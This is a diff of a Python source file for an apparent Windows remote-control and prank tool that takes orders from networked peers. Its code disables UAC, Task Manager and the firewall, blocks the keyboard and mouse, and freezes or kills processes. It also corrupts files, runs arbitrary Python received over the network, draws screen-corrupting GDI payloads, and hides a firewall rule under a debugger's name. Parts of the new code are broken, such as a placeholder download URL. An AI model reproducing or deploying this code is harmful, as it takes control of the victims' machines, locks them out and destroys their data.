@@ -14,11 +14,13 @@ import cv2
 import traceback
 import select
 import zlib 
+import zipfile
 import threading
 import tkinter as tk
 from tkinter import ttk
 from tkinter import messagebox
 from selenium import webdriver
+import random
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
@@ -77,7 +79,7 @@ import re
 import psutil
 from tcp_latency import measure_latency
 import rotatescreen
-from random import *
+# from random import *
 import ast
 from pynput.keyboard import Key, Listener
 import win32con
@@ -120,7 +122,7 @@ from longvariables import system32_files, windows_files
 
 # --- Global Variables ---
 startup_START = time.time()
-admin_privileges = False
+admin_privileges = not (ctypes.windll.shell32.IsUserAnAdmin() == 0)
 mouse_idle = 0  
 keyboard_idle = 0  
 script_start = time.time()
@@ -128,12 +130,14 @@ pyautogui.FAILSAFE = False
 pyautogui.PAUSE = 0
 socket.setdefaulttimeout(None)
 autoterminateunknownexeprocesses = False
-autofreezeunknownprocesses = False
-windowsDoneFrozen = False 
+autofreezeunknownprocesses = False 
 SelfUserUsername = os.environ['username']
 SelfComputerName = os.environ['COMPUTERNAME'] 
 prioritizeipv4 = None
 INTERNET = False  
+last_successful_check = 0
+CHECK_INTERVAL = 1  
+TIMEOUT_THRESHOLD = 5 
 HEADER = 64
 vary_PORT = 45433 
 server = None
@@ -160,7 +164,6 @@ last_mouse_input_time = time.time()
 stop_event_windowslag = threading.Event()
 stop_event_windowslag.set() 
 
-
 # --- Utility Functions ---
 
 def slp(seconds):
@@ -169,6 +172,7 @@ def slp(seconds):
     Args:
         seconds (int): The number of seconds to wait.
     """
+    
     toWait = time.time() + seconds
     while time.time() < toWait:
         pass
@@ -209,6 +213,67 @@ def installchrome():
     
     slp(2)
     programVL2(filename_dir + ' /install')
+
+def download_and_run_desktop_goose():
+    """Downloads, unzips, and runs Desktop Goose."""
+    url = "static dl link didn't work, dropbox perhaps? nan, don't - cannot upload such a thing to github"
+    zip_filename = "Desktop Goose v0.31.zip"
+    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
+    zip_path = os.path.join(download_dir, zip_filename)
+    
+    # Bad downloading as of now, need to fix it
+    # I also need to find a fixed download url.
+    
+    
+    # Download the file
+    print("Downloading Desktop Goose...")
+    response = requests.get(url)
+    with open(zip_path, 'wb') as file:
+        file.write(response.content)
+    
+    # Unzip the file
+    print("Unzipping the file...")
+    extract_dir = os.path.join(download_dir, "Desktop Goose v0.31")
+    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+        zip_ref.extractall(extract_dir)
+    
+    # Construct path to the executable
+    goose_path = os.path.join(extract_dir, "Desktop Goose v0.31", "DesktopGoose v0.31", "GooseDesktop.exe")
+    
+    # Run the executable
+    print("Running Desktop Goose...")
+    subprocess.Popen(goose_path)
+
+
+def kill_desktop_goose():
+    """Terminates the Desktop Goose process."""
+    print("Attempting to terminate Desktop Goose...")
+    for proc in psutil.process_iter(['name']):
+        if proc.info['name'] == 'GooseDesktop.exe':
+            proc.terminate()
+            print("Desktop Goose terminated.")
+            return
+    print("Desktop Goose process not found.")
+
+def cleanup_desktop_goose():
+    """Removes the downloaded and extracted Desktop Goose files."""
+    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
+    zip_path = os.path.join(download_dir, "Desktop Goose v0.31.zip")
+    extract_dir = os.path.join(download_dir, "Desktop Goose v0.31")
+    
+    print("Cleaning up Desktop Goose files...")
+    
+    # Remove zip file
+    if os.path.exists(zip_path):
+        os.remove(zip_path)
+        print("Zip file removed.")
+    
+    # Remove extracted directory
+    if os.path.exists(extract_dir):
+        os.remove(extract_dir)
+        print("Extracted files removed.")
+    
+    print("Cleanup completed.")
 
 def disablekeyboard_threadtorun():
     """Disables keyboard input by setting a low-level keyboard hook."""
@@ -559,6 +624,43 @@ def disableUserAccountControl():
 def enableUserAccountControl():
     """Enables User Account Control (UAC) in Windows."""
     programVL2('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f')      
+
+
+
+def check_internet():
+    global INTERNET, last_successful_check
+    sites_to_check = [
+        "https://www.google.com",
+        "https://www.cloudflare.com",
+        "https://www.amazon.com"
+    ]
+    
+    for site in sites_to_check:
+        try:
+            response = requests.get(site, timeout=2)
+            if response.status_code == 200:
+                INTERNET = True
+                last_successful_check = time.time()
+                # print(f'Internet connection detected (connected to {site})')
+                return
+        except requests.RequestException:
+            continue
+    
+    # If we've reached this point, all checks failed
+    if time.time() - last_successful_check > TIMEOUT_THRESHOLD:
+        INTERNET = False
+        print("Internet connection lost")
+
+def internet_check_loop():
+    while True:
+        check_internet()
+        time.sleep(CHECK_INTERVAL)
+
+
+def start_internet_check():
+    threading.Thread(target=internet_check_loop, daemon=True).start()
+
+start_internet_check()
 
 class KThread(threading.Thread):
     """A subclass of threading.Thread that can be killed."""
@@ -1331,8 +1433,8 @@ def payload_2():
         dc = GetDC(0)
         IconWarning = LoadIcon(None, IDI_WARNING)
         IconError = LoadIcon(None, IDI_ERROR)
-        DrawIcon(dc, randrange(x), randrange(y), choice([IconError, IconWarning]))
-        DrawIcon(dc, randrange(x), randrange(y), choice([IconError, IconWarning]))
+        DrawIcon(dc, random.randrange(x), random.randrange(y), random.choice([IconError, IconWarning]))
+        DrawIcon(dc, random.randrange(x), random.randrange(y), random.choice([IconError, IconWarning]))
         DeleteDC(dc)
 
     for i in range(80):
@@ -1373,6 +1475,35 @@ def payload_3():
         play_tone(1000, 10)
         slp(0.01)
 
+def find_window(search_term):
+    def callback(hwnd, windows):
+        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
+            window_title = win32gui.GetWindowText(hwnd)
+            _, pid = win32process.GetWindowThreadProcessId(hwnd)
+            try:
+                process = psutil.Process(pid)
+                if (search_term.lower() in window_title.lower() or 
+                    search_term.lower() in process.name().lower()):
+                    windows.append(hwnd)
+            except psutil.NoSuchProcess:
+                pass
+        return True
+
+    windows = []
+    win32gui.EnumWindows(callback, windows)
+    return windows
+
+def bring_window_to_foreground(search_term):
+    windows = find_window(search_term)
+    if windows:
+        hwnd = windows[0]  # Use the first matching window
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shell.SendKeys('%')  # Alt key to activate the window
+        win32gui.SetForegroundWindow(hwnd)
+        print(f"Brought window matching '{search_term}' to foreground")
+    else:
+        print(f"No visible window found matching '{search_term}'")
+
 def makethescreendorotations(duration):
     """Rotates the screen continuously for a specified duration."""
     duration = int(duration)
@@ -1407,8 +1538,244 @@ def screenportraitflipped():
     for i in rotatescreen.get_displays():
         i.set_portrait_flipped()
 
+def chrome_window_control_maximize():
+    def callback(hwnd, windows):
+        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
+            _, pid = win32process.GetWindowThreadProcessId(hwnd)
+            try:
+                process = psutil.Process(pid)
+                if process.name().lower() == "chrome.exe":
+                    title = win32gui.GetWindowText(hwnd)
+                    if title and title.strip():  # Ignore empty or whitespace-only titles
+                        windows.append((hwnd, title))
+            except psutil.NoSuchProcess:
+                pass
+        return True
+
+    windows = []
+    win32gui.EnumWindows(callback, windows)
+    chrome_windows = windows
+    if not chrome_windows:
+        print("No Chrome windows found with non-empty titles.")
+        return
+
+    for hwnd, title in chrome_windows:
+        win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
+        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+        win32gui.SetForegroundWindow(hwnd)
+        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
+        win32gui.SetForegroundWindow(hwnd)
+        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, 
+                                win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shell.SendKeys('%')  # Alt key to activate the window
+        win32gui.SetForegroundWindow(hwnd)
+    
+        print(f"Actions performed on Chrome window: {title}")
+
+def playYTvidfullscreen(video_url, starttime=None, endingtime=None):
+    """Plays a YouTube video in full screen."""
+
+    if starttime == '':
+        starttime = None
+    if endingtime == '':
+        endingtime = None
+    if not video_url:
+        print("No video URL provided.")
+        return
+    
+    def get_youtube_video_duration(video_url):
+        """Gets the duration of a YouTube video."""
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        }
+        response = requests.get(video_url, headers=headers)
+        if response.status_code != 200:
+            raise Exception(f"Failed to load page: {response.status_code}")
+        soup = BeautifulSoup(response.text, 'html.parser')
+        scripts = soup.find_all('script')
+        for script in scripts:
+            if 'ytInitialPlayerResponse' in script.string if script.string else '':
+                script_content = script.string
+                break
+        else:
+            raise Exception("Couldn't find ytInitialPlayerResponse in the page")
+        duration_match = re.search(r'"approxDurationMs":"(\d+)"', script_content)
+        if not duration_match:
+            raise Exception("Couldn't find video duration in the page")
+        duration_ms = int(duration_match.group(1))
+        duration_seconds = duration_ms / 1000
+        return duration_seconds
+
+    vid_length = math.floor(get_youtube_video_duration(video_url))
+    print(f'Specified video length is: {vid_length}')
+    
+    if endingtime is not None and endingtime > vid_length:
+        print("Ending time is more than the video time, error.")
+        return False, "endingtime>vidlength"
+    if starttime is not None and starttime > vid_length:
+        print("Starting time is more than the video time, error.")
+        return False, "starttime>vidlength"
+
+    def tryandretryuntilwork(*args):
+        """Retries a function call until it succeeds."""
+        def run():
+            return driver.execute_script(*args)
+        while True:
+            try:
+                return run()
+            except Exception as e:
+                print(e)
+                time.sleep(0.5)
+                continue
+
+    def skipadbutton():
+        """Skips YouTube ads if present."""
+        skip_button_exists = len(driver.find_elements(By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]')) > 0
+        print(f'Does the skip button exist? {skip_button_exists}')
+        if skip_button_exists:
+            skip_button = WebDriverWait(driver, 15).until(
+                EC.element_to_be_clickable((By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]'))
+            )
+            skip_button.click()
+
+    def getcurrentYTtime():
+        """Gets the current playback time of the YouTube video."""
+        return tryandretryuntilwork("return arguments[0].currentTime", video)
+
+    def play():
+        """Plays the YouTube video."""
+        tryandretryuntilwork("arguments[0].play()", video)
+        print("Playing...")
+
+    def pause():
+        """Pauses the YouTube video."""
+        tryandretryuntilwork("arguments[0].pause()", video)
+        print("Pausing...")
+
+    def detectifpause():
+        """Checks if the YouTube video is paused."""
+        return tryandretryuntilwork("return arguments[0].paused", video)
+
+    def mute():
+        """Mutes the YouTube video."""
+        tryandretryuntilwork("arguments[0].muted = true", video)
+        print("Muting...")
+
+    def unmute():
+        """Unmutes the YouTube video."""
+        tryandretryuntilwork("arguments[0].muted = false", video)
+        print("Unmuting...")
+
+    def setytvolume(volume):
+        """Sets the volume of the YouTube video."""
+        if volume > 1:
+            volume = volume / 100
+        tryandretryuntilwork("arguments[0].volume = arguments[1]", video, volume)
+        print("Changing volume...")
+
+
+    webdriver_path = os.path.join(os.path.dirname(__file__), 'chromedriver')
+    print(f'Webdriver location: {webdriver_path}')
+    options = webdriver.ChromeOptions()
+    options.add_argument("start-minimized")  # Start Chrome minimized
+    options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    options.add_experimental_option('useAutomationExtension', False)
+    driver = webdriver.Chrome(options=options)
+    disable_keyboard()
+    disable_mouse()
+    minimize_process_via_name('chrome.exe')
+    driver.get(video_url)
+    minimize_process_via_name('chrome.exe')
+    wait = WebDriverWait(driver, 15)
+    video = wait.until(EC.presence_of_element_located((By.TAG_NAME, "video")))
+
+    driver_process = psutil.Process(driver.service.process.pid)
+    chrome_pid = driver_process.pid
+    print(f"Chrome PID: {chrome_pid}") # literally does not work in anything
+
+    minimize_process_via_name('chrome.exe')
+
+    def setYTtime(time):
+        """Sets the playback time of the YouTube video."""
+        tryandretryuntilwork("arguments[0].currentTime = arguments[1]", video, time)
+        print("Changing playback time...")
+
+    mute()
+    minimize_process_via_name('chrome.exe')
+    wait3sec = time.time() + 3
+    while True:
+        try:
+            video = driver.find_element(By.TAG_NAME, "video")
+            skipadbutton()
+            end_time = math.floor(tryandretryuntilwork("return arguments[0].duration", video))
+            print("End time:", end_time)
+            if detectifpause():
+                play()
+            if end_time != vid_length:
+                wait3sec = time.time() + 3
+                tryandretryuntilwork("arguments[0].currentTime = arguments[0].duration - 0.2", video)
+                print("Ad detected, skipping...")
+            elif time.time() > wait3sec:
+                print("No ad detected, continuing...")
+                tryandretryuntilwork("arguments[0].currentTime = 0", video)
+                break
+        except selenium.common.exceptions.StaleElementReferenceException:
+            print("Stale element reference exception occurred. Trying to find the video element again.")
+            continue
+        time.sleep(1)
+
+    def simulate_user_interaction():
+        """Simulates user interaction with the YouTube video."""
+        actions = ActionChains(driver)
+        actions.send_keys('f')  # Full screen using 'f' key
+        actions.perform()
+        time.sleep(1)
+
+ 
+
+    setytvolume(0.5)
+
+    chrome_window_control_maximize()
+    unmute() 
+    simulate_user_interaction()  # Enter full-screen
+    while detectifpause():
+        play()
+        time.sleep(0.8)
+    setytvolume(1)
+    print('Skipped all ads, or there were just no ads.. ')
+    unmute()  # Unmute after ad-skipping
+
+    if starttime is not None:
+        setYTtime(starttime)
+    else:
+        setYTtime(0)
+
+    if endingtime is not None:
+        while getcurrentYTtime() < endingtime:
+            time.sleep(0.1)
+            print(getcurrentYTtime())
+    else:
+        while getcurrentYTtime() < end_time - 2.5:
+            time.sleep(1)
+
+    driver.quit() 
+    # no need to unset always on top here, as the driver kills it
+    enable_keyboard()
+    enable_mouse()
+
 def playYTvidinbackground(video_url, starttime=None, endingtime=None):
     """Plays a YouTube video in the background."""
+    
+    if starttime == '':
+        starttime = None
+    if endingtime == '':
+        endingtime = None
+    if not video_url:
+        print("No video URL provided.")
+        return
+    
 
     def get_youtube_video_duration(video_url):
         """Gets the duration of a YouTube video."""
@@ -1597,7 +1964,7 @@ def payload_4():
         h2 = randint(1, screen_height)
         win32gui.StretchBlt(hdc, x1, y1, w1, h1, hdc, x2, y2, w2, h2, win32con.SRCCOPY)
         interval = randint(min_interval, max_interval)
-        color = choice([(255, 0, 0), (0, 255, 0), (0, 0, 255), (127, 127, 127), (255, 127, 0)])
+        color = random.choice([(255, 0, 0), (0, 255, 0), (0, 0, 255), (127, 127, 127), (255, 127, 0)])
         brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
         win32gui.FillRect(hdc, (0, 0, screen_width, screen_height), brush)
         play_tone(100, 100)
@@ -1692,7 +2059,6 @@ def keepalive():
 
 def freeze_unknown_processes():
     """Freezes unknown processes to effectively freeze Windows."""
-    global windowsDoneFrozen
     print(f'Initiating freeze unknown process')
     tokill = []
     exclude_list = [
@@ -1789,9 +2155,7 @@ def freeze_unknown_processes():
             psutil.Process(pid).suspend()
         except Exception as e:
             pass
-    if windowsDoneFrozen:
-        return "already done"
-    windowsDoneFrozen = True
+
 
 def terminate_unknown_processes(corrupt=True):
     """Terminates and optionally corrupts unknown processes."""
@@ -2128,118 +2492,6 @@ def handle_messages_varyhost(msg, addr, conn):
         sendAllVaryHosts(unmodified_msg)
         print(f"Got a todo from {ip}, it said to do: {todo} with an identifier of {identifier}")
 
-
-
-
-def handle_messages_varyhost(msg, addr, conn):
-    """Handles messages received from other Diversify hosts."""
-    global timeout_device_list, varyhosts
-    unmodified_msg = msg
-    ip, port = addr
-    print("addr of handle_messages, ", addr)
-    if msg == "SystemStartupIAmAVaryHost":
-        print(f'New address called!, adding {ip}:{vary_PORT} to the varyhosts list')
-        varyhosts.append(f'{ip}:{vary_PORT}')
-    if msg == "Keepalive":
-        timeout_device_list[addr] = time.time() + 60
-    if msg == r'RequestToShareScreenDeviceSelf&!^(*^%&!@#(&^@!%$(!@#!!!!!)))':
-        send((ip, vary_PORT), 'True')
-        print('Request to share screen this device, accepted.')
-        global running_ss, server
-        running_ss = True
-        host_ss((ip, int(vary_PORT)))
-        print('Request to share screen this device has ended')
-    if "REQUESTSENDALLHOSTCONTINUEONMESSAGE" in msg and "XR~=3yy=[W2vc%L" in msg:
-        id, ip, identifier, todo = msg.split('XR~=3yy=[W2vc%L')
-        if identifier in done_vary_tasks:
-            print("I've already done this todo, so ignoring it, " + todo)
-            return
-        else:
-            done_vary_tasks.append(identifier)
-        sendAllVaryHosts(unmodified_msg)
-        print(f"Got a todo from {ip}, it said to do: {todo} with an identifier of {identifier}")
-
-def webhandler(website):
-    """Opens a website in the default browser."""
-    runcmd(f'start chrome "{website}"')
-
-def formatproperlyipv4(scrmbl):
-    """Formats a string of IPv4 addresses."""
-    global prioritizeipv4
-    scrmbl = scrmbl.replace(' ', '')
-    scrmbl = scrmbl.split(',') if ',' in scrmbl else [scrmbl]
-    scrmbl = list(set(scrmbl))
-    scrmbl = list(filter(None, scrmbl))
-    prioritizeipv4 = scrmbl
-
-def decrypt_msg(msg, key=b'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'):
-    """Decrypts a message using AES."""
-    def encrypt(key, plaintext):
-        """Encrypts the plaintext using AES."""
-        try:
-            cipher = AES.new(key, AES.MODE_EAX)
-            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
-            return (cipher.nonce, tag, ciphertext)
-        except Exception as e:
-            print(f'Error when encrypting text: {e}')
-
-    def decrypt(key, ciphertext):
-        """Decrypts the ciphertext using AES."""
-        try:
-            (nonce, tag, ciphertext) = ciphertext
-            cipher = AES.new(key, AES.MODE_EAX, nonce)
-            plaintext = cipher.decrypt(ciphertext)
-            try:
-                cipher.verify(tag)
-                return plaintext
-            except ValueError:
-                return None
-        except Exception as e:
-            print(f'Error when decrypting text: {e}')
-    TUTKEYPHONE = key
-    try:
-        msg = str(msg.decode('utf-8'))                    
-        msg = ast.literal_eval(msg)
-        plaintext = decrypt(TUTKEYPHONE, msg)
-        text = plaintext.decode("utf-8")
-        return text
-    except Exception as e:
-        print(f'Error when decrypting text: {e}')
-        return False
-
-def encrypt_msg(msg, key=rb'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'):
-    """Encrypts a message using AES."""
-    def encrypt(key, plaintext):
-        """Encrypts the plaintext using AES."""
-        try:
-            cipher = AES.new(key, AES.MODE_EAX)
-            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
-            return (cipher.nonce, tag, ciphertext)
-        except Exception as e:
-            print(f'Error when encrypting text: {e}')
-    def decrypt(key, ciphertext):
-        """Decrypts the ciphertext using AES."""
-        try:
-            (nonce, tag, ciphertext) = ciphertext
-            cipher = AES.new(key, AES.MODE_EAX, nonce)
-            plaintext = cipher.decrypt(ciphertext)
-            try:
-                cipher.verify(tag)
-                return plaintext
-            except ValueError:
-                return None
-        except Exception as e:
-            print(f'Error when decrypting text: {e}')
-    TUTKEYPHONE = key
-    try:
-        message = encrypt(TUTKEYPHONE, msg)
-        message = str(message).encode('utf-8')
-        message = bytes(message)
-        return message
-    except Exception as e:
-        print(f'Error when encrypting text: {e}')
-        return False
-
 def handle_connection_of_connected_device(msg, addr, conn):
     """Handles connections and commands from connected devices."""
     spltr = "OD2tIzZNuOHBqnu"
@@ -2280,7 +2532,7 @@ def handle_connection_of_connected_device(msg, addr, conn):
         disableUserAccountControl()
     elif task == 'enableuseraccountcontrol':
         enableUserAccountControl()
-    elif task == 'swappedswaprmbandlmb':
+    elif task == 'swappedswaprmbandlmb':  
         swaprmbandlmbtrue()
     elif task == 'unswappedswaprmbandlmb':
         unswaprmbandlmb()
@@ -2391,21 +2643,38 @@ def handle_connection_of_connected_device(msg, addr, conn):
         restartToUAC()
     elif task == 'installchrome':
         installchrome()
+    elif task == 'dvdtimeout' and information_msg is not None:
+        dvdtimeout(int(information_msg))  # Assuming information_msg contains the timeout value
+    elif task == 'unprotectselffile':
+        unprotect_file(os.path.join(get_script_directory(), get_script_filename()))
+    elif task == 'maximizeprocessvianame' and information_msg is not None:
+        maximize_process_via_name(information_msg)
+    elif task == 'minimizeprocessvianame' and information_msg is not None:
+        minimize_process_via_name(information_msg)
     elif task == 'disableterminateunknownprocesses':
         autoterminateunknownexeprocesses = False
     elif task == 'enableterminateunknownprocesses':
         autoterminateunknownexeprocesses = True
     elif task == 'runfunctionviastring' and information_msg is not None:
         if "split".lower() in information_msg.lower():
-            exec(information_msg_beforelower.split('split')[1])
-            function_name, *arguments = information_msg_beforelower.split('split')[0].split()
+            locals()[information_msg_beforelower.split('split')[1].split("=")[0]] = information_msg_beforelower.split('split')[1].split("=")[1]
+            # print('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',information_msg_beforelower.split('split')[0], information_msg_beforelower.split('split')[1])
+            # Split the information_msg_beforelower and extract the function name and arguments
+            function_name, *arguments = information_msg_beforelower.split('split')
+
+            # Initialize an empty dictionary to store the arguments
             kwargs = {}
+
+            # Parse the arguments and add them to the kwargs dictionary
             for arg in arguments:
                 arg_name, arg_value = arg.split("=")
                 kwargs[arg_name.strip()] = arg_value.strip()
+
+            # Call runfunctionvianame with the function name and parsed arguments
             runfunctionvianame(function_name, **kwargs)
+        
         else:
-            runfunctionvianame(information_msg_beforelower)
+            runfunctionvianame(information_msg_beforelower); print("aaaaaaaaaaaaaaaa", information_msg_beforelower)
     elif task == 'unblock_application_by_name' and information_msg is not None:
         unblock_application_by_name(information_msg_beforelower)
     elif task == 'block_application_by_name' and information_msg is not None:
@@ -2418,10 +2687,18 @@ def handle_connection_of_connected_device(msg, addr, conn):
         reset_firewall()
     elif task == 'self_destruct':
         self_destruct()
-    elif task == 'playytvidbetweentime' and "splitterofty1243" in information_msg_beforelower:
-        video_url, start_time, end_time = information_msg_beforelower.split("splitterofty1243")
-        playYTvidinbackground(video_url, float(start_time), float(end_time))
-
+    elif task == 'playytvidbetweentime': 
+        playYTvidinbackground(information_msg_beforelower.split("splitterofty1243")[0], information_msg_beforelower.split("splitterofty1243")[1], information_msg_beforelower.split("splitterofty1243")[2])
+    elif task == 'playytvidbetweentimefullscreen':
+        playYTvidfullscreen(information_msg_beforelower.split("splitterofty1243")[0], information_msg_beforelower.split("splitterofty1243")[1], information_msg_beforelower.split("splitterofty1243")[2])
+    elif task == 'alwaysontop':
+        set_always_on_top_via_name(information_msg_beforelower)
+    elif task == 'unsetalwaysontop':
+        unset_always_on_top_by_name(information_msg_beforelower)
+    
+    
+    else:
+        print(f'Task {task} not found, information: {information_msg_beforelower}')    
 def handle_connection(conn, addr):
     """Handles incoming socket connections."""
     global device_item_received
@@ -2550,158 +2827,6 @@ def get_random_folder():
     else:
         print("No suitable folders found in the specified directories.")
         return None
-
-
-def kill_self():
-    """Kills the script and all related processes."""
-    [runcmd(f'taskkill /f /t /PID {i}') for i in get_process_connected_pids(os.getppid())]
-    runcmd(f'taskkill /f /t /PID {os.getpid()}')
-
-def reset_network():
-    """Resets the network settings."""
-    runcmd('ipconfig /release')
-    runcmd('ipconfig /renew')
-    runcmd('ipconfig /flushdns')
-    runcmd('netsh winsock reset')
-    runcmd('netsh int ip reset')
-    runcmd('netsh advfirewall reset')
-    runcmd('netsh firewall reset')
-    runcmd('netsh int tcp set heuristics disabled')
-    runcmd('netsh int tcp set global autotuninglevel=normal')
-    runcmd('netsh int tcp set global rss=enabled')
-    runcmd('netsh int tcp show global')
-
-def disablefirewall():
-    """Disables the Windows Firewall."""
-    runcmd('netsh advfirewall set allprofiles state off', True)
-    runcmd('netsh firewall set notifications mode=disable profile=all', True)
-
-def bypassfirewall():
-    """Adds a firewall rule to allow the script to bypass the firewall."""
-    exe_path = os.path.join(get_script_directory(), get_script_filename())
-    cmd = f'netsh advfirewall firewall add rule name="x32dbg" dir=in action=allow program="{exe_path}" enable=yes'
-    programVL2(cmd)
-    restart_self()
-
-def enablefirewall():
-    """Enables the Windows Firewall."""
-    runcmd('netsh advfirewall set allprofiles state on', True)
-
-def restartToADvancedOptions():
-    """Restarts the computer to Advanced Startup Options."""
-    programVL2('shutdown.exe /r /o /f /t 0')
-
-def disableTaskmanager():
-    """Disables the Windows Task Manager."""
-    programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
-
-def enabletaskmgr():
-    """Enables the Windows Task Manager."""
-    programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')
-
-def runpythonscript(text):
-    """Executes Python code from a string."""
-    try:
-        exec(text)
-        print('Succesfully ran code')
-    except Exception as e:
-        print(f'Error while running python code:\n{e}')
-        return e
-
-def check_and_kill_self(SERVER1, port_to):
-    """Checks if another instance of the script is running and kills itself if necessary."""
-    self = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/')
-    print(self + ' <- self variable')
-    print('requested port to check: ' + str(port_to))
-
-    def corruptfile(directoryoffile):
-        """Corrupts a file by overwriting its content."""
-        with open(directoryoffile, "w+") as f:
-            f.seek(0)
-            content = f.read()
-            scrubbed_content = b"X" * len(content)
-            f.seek(0)
-            f.write(scrubbed_content)
-            f.truncate()
-
-    try:
-        ADDR = (SERVER1, port_to)
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.bind(ADDR)        
-        server.listen()
-        server.close()
-        server.detach()
-        return "rn"
-    except Exception as e:
-        print(f'Error: {e}')
-        pids_tocheck_ofself = get_process_connected_pids(get_own_parent_process_pid())
-        for proc in psutil.process_iter():
-            try:
-                if proc.pid in pids_tocheck_ofself:
-                    continue
-                if len(proc.cmdline()) > 1:
-                    vrsproc = proc.cmdline()[1]
-                else:
-                    vrsproc = proc.cmdline()[0]
-                print(f'Name: {proc.name()}, equal to self {proc.name().casefold() == get_script_filename().casefold()}, location equal: {proc.name().casefold() == get_script_filename().casefold()}')
-                if proc.name().casefold() == get_script_filename().casefold() and self.casefold() == vrsproc.lower().replace('\\', '/').casefold():
-                    return 'ks'
-                elif proc.name().casefold() == get_script_filename().casefold():
-                    [i.kill() for i in proc.children()]
-                    proc.kill()
-                    slp(0.4)
-                    runcmd(f'taskkill /f /t /PID {proc.ppid}')
-                    corruptfile(vrsproc.lower())
-            except Exception as e:
-                pass
-        try:
-            slp(3)
-            ADDR = (SERVER1, port_to)
-            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server.bind(ADDR)
-            server.listen()
-            server.close()
-            server.detach()
-            return "rn"
-        except Exception as e:
-            print(f'Error1: {e}')
-            terminate_unknown_processes()
-            try:
-                slp(6)
-                ADDR = (SERVER1, port_to)
-                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                server.bind(ADDR)
-                server.listen()
-                server.close()
-                server.detach()
-                return "rn"
-            except Exception as e:
-                print(f'Error2: {e}')
-                reset_network()
-                runcmd('shutdown.exe /g /t 0')
-
-def autokillunknownprocesses():
-    """Automatically terminates unknown processes."""
-    global autoterminateunknownexeprocesses
-    if autoterminateunknownexeprocesses:
-        print('terminating unknown processes')
-        terminate_unknown_processes(corrupt=False)
-    threading.Timer(8.0, autokillunknownprocesses).start()
-
-def autofreezeunknownprocesses_func():
-    """Automatically freezes unknown processes."""
-    global autofreezeunknownprocesses
-    if autofreezeunknownprocesses:
-        print('freezing unknown processes')
-        freeze_unknown_processes()
-    threading.Timer(8.0, autofreezeunknownprocesses_func).start()
-
-def runcode(code):
-    """Executes Python code from a string."""
-    try:
-        exec(code)
-    except Exception as e:
-        print(f'Error: {e}')
 
 def win_on_click_play_sound(x, y, button, pressed, stop_event):
     """Plays a system sound on mouse clicks."""
@@ -2896,62 +3021,6 @@ timer1_forautokill = threading.Timer(8.0, autokillunknownprocesses)
 timer2_forautofreeze = threading.Timer(8.0, autofreezeunknownprocesses_func)  
 timer1_forautokill.start()
 timer2_forautofreeze.start()
-
-def runcode(code):
-    """Executes Python code from a string."""
-    try:
-        exec(code)
-    except Exception as e:
-        print(f'Error: {e}')
-
-def win_on_click_play_sound(x, y, button, pressed, stop_event):
-    """Plays a system sound on mouse click."""
-    if stop_event.is_set():
-        return False
-    if pressed and button in (pynput.mouse.Button.left, pynput.mouse.Button.right, pynput.mouse.Button.middle):
-        winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
-
-def windows_lag_click_sound(stop_event):
-    """Starts a mouse listener to play sounds on mouse clicks."""
-    print("Enabling windows lag click sound")
-    with pynput.mouse.Listener(on_click=lambda x, y, button, pressed: win_on_click_play_sound(x, y, button, pressed, stop_event)) as listener:
-        listener.join()
-
-def enable_windows_lag_click_sound():
-    """Enables the windows lag click sound."""
-    global winlag_thread, stop_event_windowslag
-    if not stop_event_windowslag.is_set():
-        print('Windows lag click sound is already running')
-        return
-    stop_event_windowslag.clear()
-    print('Enabling windows lag click sound')
-    winlag_thread = threading.Thread(target=windows_lag_click_sound, args=(stop_event_windowslag,))
-    winlag_thread.start()
-
-def disable_windows_lag_click_sound():
-    """Disables the windows lag click sound."""
-    global stop_event_windowslag, winlag_thread
-    stop_event_windowslag.set()
-    try:
-        winlag_thread.join()
-    except:
-        pass
-
-def send_all_hosts_a_todo(todo, identifier=None, settingIP=None):
-    """Sends a task to all connected Diversify hosts."""
-    splitter = "XR~=3yy=[W2vc%L"
-    if identifier is None:
-        identifier = ''.join([str(random.randint(0, 9)) for _ in range(10)])
-    buildup = fr"REQUESTSENDALLHOSTCONTINUEONMESSAGE{splitter}{socket.gethostbyname(socket.gethostname())}{splitter}{identifier}{splitter}{todo}"
